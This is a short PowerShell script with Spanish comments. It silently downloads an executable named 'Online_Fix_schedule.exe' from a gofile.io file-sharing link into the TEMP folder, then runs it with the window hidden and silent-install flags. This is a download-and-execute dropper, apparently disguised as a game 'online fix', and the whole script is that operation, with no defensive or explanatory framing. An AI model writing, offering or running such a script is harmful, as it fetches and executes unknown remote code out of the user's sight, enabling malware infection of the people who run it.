# Ruta temporal donde guardar el archivo
$tempPath = "$env:TEMP\Online_Fix_schedule.exe"

# URL del archivo a descargar
$url = "https://store10.gofile.io/download/web/eac7e870-f22a-4062-9a8c-194acd0c58b3/Online_Fix_schedule.exe"

# Descarga silenciosa
Invoke-WebRequest -Uri $url -OutFile $tempPath -UseBasicParsing

# Esperar un momento por seguridad
Start-Sleep -Seconds 2

# Ejecutar el archivo descargado en modo silencioso (si el instalador lo soporta)
Start-Process -FilePath $tempPath -ArgumentList "/silent", "/verysilent", "/norestart" -WindowStyle Hidden
